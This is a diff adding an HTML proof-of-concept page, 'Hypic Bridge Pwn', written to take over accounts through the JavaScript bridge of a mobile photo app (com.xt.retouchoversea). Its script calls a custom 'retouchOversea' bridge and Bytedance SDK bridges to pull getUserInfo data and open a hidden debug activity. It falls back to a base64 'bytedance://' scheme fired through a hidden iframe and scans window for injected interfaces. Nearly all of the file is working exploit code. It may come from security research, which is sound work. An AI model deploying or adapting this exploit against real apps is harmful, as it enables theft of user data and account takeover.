@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Hypic JSB ATO PoC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: sans-serif; padding: 20px; }
+        #output { background: #f4f4f4; padding: 10px; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; max-height: 400px; overflow-y: auto;}
+        button { padding: 15px 20px; font-size: 16px; background: #ff3b30; color: white; border: none; border-radius: 5px; cursor: pointer; margin-bottom: 10px; width: 100%;}
+    </style>
+</head>
+<body>
+    <h1>Hypic Bridge Pwn</h1>
+    
+    <button onclick="attackCustomBridge()">1. Attack Custom Bridge (No Auth)</button>
+    <button onclick="attackSDKBridge('getUserInfo')">2. Attack SDK Bridge (getUserInfo)</button>
+    <button onclick="attackSDKBridge('openSchema', {'schema': 'intent:#Intent;component=com.xt.retouchoversea/com.xt.retouch.debug.DevModelActivity;end', 'open_other_app': '1'})">3. Attack SDK Bridge (openSchema)</button>
+    
+    <h3>Execution Log:</h3>
+    <pre id="output">Ready...</pre>
+
+    <script>
+        function log(msg) {
+            var out = document.getElementById('output');
+            if (out.innerText === "Ready...") out.innerText = "";
+            out.innerText += "[*] " + msg + "\n\n";
+        }
+
+        // Global Callbacks
+        window.handleUserInfoResponse = function(msg) { log("[Custom Bridge] SUCCESS:\n" + JSON.stringify(msg, null, 2)); };
+        
+        window.JSBridge = { _handleMessageFromApp: function(msg) { log("[JSBridge] Received:\n" + JSON.stringify(msg, null, 2)); } };
+        window.ToutiaoJSBridge = { _handleMessageFromToutiao: function(msg) { log("[ToutiaoJSBridge] Received:\n" + JSON.stringify(msg, null, 2)); } };
+
+        // --- ATTACK 1: The Custom Bridge ---
+        function attackCustomBridge() {
+            log("Attempting to call custom 'retouchOversea' bridge directly...");
+            const payload = JSON.stringify({
+                func: "getUserInfo",
+                data: {}, 
+                cb: "handleUserInfoResponse"
+            });
+
+            try {
+                // Try direct global reference
+                retouchOversea.postMessage(payload);
+                log("Successfully executed global retouchOversea.postMessage!");
+            } catch (e1) {
+                try {
+                    window.retouchOversea.postMessage(payload);
+                    log("Successfully executed window.retouchOversea.postMessage!");
+                } catch (e2) {
+                    log("FAILED: Custom bridge not found. Error: " + e2.message);
+                    dumpBridges();
+                }
+            }
+        }
+
+        // --- ATTACK 2: The Bytedance SDK Bridge ---
+        function attackSDKBridge(funcName, params = {}) {
+            log("Attempting to call Bytedance SDK bridge for: " + funcName);
+            var payload = {
+                "__msg_type": "call",
+                "func": funcName,
+                "params": params,
+                "JSSDK": "1",
+                "__callback_id": "pwn_" + funcName
+            };
+            var jsonStr = JSON.stringify(payload);
+
+            try {
+                if (typeof JS2NativeBridge !== 'undefined' && JS2NativeBridge._invokeMethod) {
+                    JS2NativeBridge._invokeMethod(jsonStr);
+                    log("Executed via JS2NativeBridge._invokeMethod");
+                } else if (window.ToutiaoJSBridge && window.ToutiaoJSBridge.invokeMethod) {
+                    window.ToutiaoJSBridge.invokeMethod(jsonStr);
+                    log("Executed via ToutiaoJSBridge.invokeMethod");
+                } else {
+                    // Fallback to iframe scheme
+                    var b64Payload = btoa(unescape(encodeURIComponent(JSON.stringify([payload]))));
+                    var schemaUrl = "bytedance://private/setresult/SCENE_FETCHQUEUE&" + b64Payload;
+                    var iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.src = schemaUrl;
+                    document.body.appendChild(iframe);
+                    setTimeout(function() { iframe.remove(); }, 500);
+                    log("Executed via bytedance:// iframe scheme");
+                }
+            } catch (e) {
+                log("SDK Bridge Error: " + e.message);
+            }
+        }
+
+        // --- DIAGNOSTICS ---
+        function dumpBridges() {
+            log("Scanning window object for injected interfaces...");
+            var keys = Object.keys(window);
+            var found = false;
+            for (var i = 0; i < keys.length; i++) {
+                let k = keys[i].toLowerCase();
+                if (k.includes("bridge") || k.includes("toutiao") || k.includes("retouch") || k.includes("bytedance") || k.includes("hypic")) {
+                    log("Found potential interface: " + keys[i]);
+                    found = true;
+                }
+            }
+            if (!found) log("No suspicious interfaces found in Object.keys(window).");
+        }
+    </script>
+</body>
+</html>
